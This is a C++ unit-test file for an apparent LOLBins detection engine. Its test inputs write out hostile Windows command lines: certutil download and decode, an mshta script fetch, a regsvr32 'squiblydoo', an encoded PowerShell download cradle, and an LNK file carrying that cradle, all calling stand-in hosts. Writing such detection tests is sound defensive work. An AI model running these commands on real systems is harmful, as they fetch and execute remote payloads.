#include "gcad/engines/lolbins_engine.hpp"
#include <functional>
#include <iostream>
#include <fstream>

extern void register_test(const char* name, std::function<bool()> fn);

void register_lolbins_engine_tests() {
    register_test("lolbins_name_and_lifecycle", [] {
        gcad::LolbinsEngine engine;
        if (engine.name() != "LolbinsGuard") return false;
        if (engine.running()) return false;
        if (engine.start() != gcad::ErrorCode::OK) return false;
        if (!engine.running()) return false;
        if (engine.stop() != gcad::ErrorCode::OK) return false;
        if (engine.running()) return false;
        return true;
    });

    register_test("lolbins_cmdline_normalization", [] {
        // Strip carets and quotes inside keywords
        std::string raw = "c^e^r^t\"u\"t^i^l.exe   -u^r^l^c^a^c^h^e   -f   http://evil.com/payload.exe";
        std::string norm = gcad::LolbinsEngine::normalize_command_line(raw);
        if (norm.find("certutil.exe -urlcache -f http://evil.com/payload.exe") == std::string::npos) {
            return false;
        }
        return true;
    });

    register_test("lolbins_base64_decode_utf16le", [] {
        // "IEX (New-Object Net.WebClient).DownloadString('http://evil.com')" in UTF-16LE Base64
        // Hand-crafted or standard PowerShell encoded string:
        // 'SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAApAA=='
        std::string b64 = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAApAA==";
        auto decoded = gcad::LolbinsEngine::decode_base64(b64);
        if (!decoded.has_value()) return false;
        if (decoded->find("IEX") == std::string::npos || decoded->find("DownloadString") == std::string::npos) {
            return false;
        }
        return true;
    });

    register_test("lolbins_detects_certutil_download", [] {
        gcad::LolbinsEngine engine;
        auto res = engine.evaluate_command_line(1234, "certutil.exe", "certutil.exe -urlcache -split -f http://malware.xyz/x.bin");
        if (!res.is_malicious) return false;
        if (res.mitre_technique != "T1105") return false;
        if (res.severity < gcad::ThreatLevel::HIGH) return false;
        return true;
    });

    register_test("lolbins_detects_certutil_decode", [] {
        gcad::LolbinsEngine engine;
        auto res = engine.evaluate_command_line(1234, "certutil.exe", "certutil.exe -decode encoded.txt evil.exe");
        if (!res.is_malicious) return false;
        if (res.mitre_technique != "T1140") return false;
        if (res.severity < gcad::ThreatLevel::HIGH) return false;
        return true;
    });

    register_test("lolbins_detects_mshta_inline_script", [] {
        gcad::LolbinsEngine engine;
        auto res = engine.evaluate_command_line(5678, "mshta.exe", "mshta.exe javascript:a=GetObject('script:http://c2.org/s.sct').Exec();close();");
        if (!res.is_malicious) return false;
        if (res.mitre_technique != "T1218.005") return false;
        if (res.severity != gcad::ThreatLevel::CRITICAL) return false;
        return true;
    });

    register_test("lolbins_detects_regsvr32_squiblydoo", [] {
        gcad::LolbinsEngine engine;
        auto res = engine.evaluate_command_line(9999, "regsvr32.exe", "regsvr32.exe /s /u /n /i:http://attack.net/payload.sct scrobj.dll");
        if (!res.is_malicious) return false;
        if (res.mitre_technique != "T1218.010") return false;
        if (res.severity != gcad::ThreatLevel::CRITICAL) return false;
        return true;
    });

    register_test("lolbins_detects_powershell_encoded_cradle", [] {
        gcad::LolbinsEngine engine;
        std::string cmd = "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAApAA==";
        auto res = engine.evaluate_command_line(2468, "powershell.exe", cmd);
        if (!res.is_malicious) return false;
        if (res.mitre_technique != "T1059.001") return false;
        if (res.severity != gcad::ThreatLevel::CRITICAL) return false;
        if (res.decoded_payload.empty()) return false;
        return true;
    });

    register_test("lolbins_allows_benign_commands", [] {
        gcad::LolbinsEngine engine;
        // Benign certutil hash
        auto r1 = engine.evaluate_command_line(100, "certutil.exe", "certutil.exe -hashfile sample.txt SHA256");
        if (r1.is_malicious) return false;

        // Benign powershell get-process
        auto r2 = engine.evaluate_command_line(101, "powershell.exe", "powershell.exe -Command Get-Process");
        if (r2.is_malicious) return false;

        // Benign rundll32 lock workstation
        auto r3 = engine.evaluate_command_line(102, "rundll32.exe", "rundll32.exe user32.dll,LockWorkStation");
        if (r3.is_malicious) return false;

        return true;
    });

    register_test("lolbins_inspects_weaponized_lnk", [] {
        gcad::LolbinsEngine engine;
        // Create synthetic dummy LNK file with embedded powershell cradle
        std::vector<uint8_t> dummy_lnk(128, 0);
        dummy_lnk[0] = 0x4C; // LNK header size
        std::string payload = "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAApAA==";
        for (size_t i = 0; i < payload.size() && (40 + i) < dummy_lnk.size(); ++i) {
            dummy_lnk[40 + i] = static_cast<uint8_t>(payload[i]);
        }

        auto temp_lnk = std::filesystem::temp_directory_path() / "test_invoice.lnk";
        {
            std::ofstream ofs(temp_lnk, std::ios::binary);
            ofs.write(reinterpret_cast<const char*>(dummy_lnk.data()), dummy_lnk.size());
        }

        gcad::LolbinExecution exec;
        bool detected = engine.inspect_lnk_file(temp_lnk, exec);
        std::error_code ec;
        std::filesystem::remove(temp_lnk, ec);

        return detected && exec.is_malicious && exec.mitre_technique == "T1059.001";
    });
}
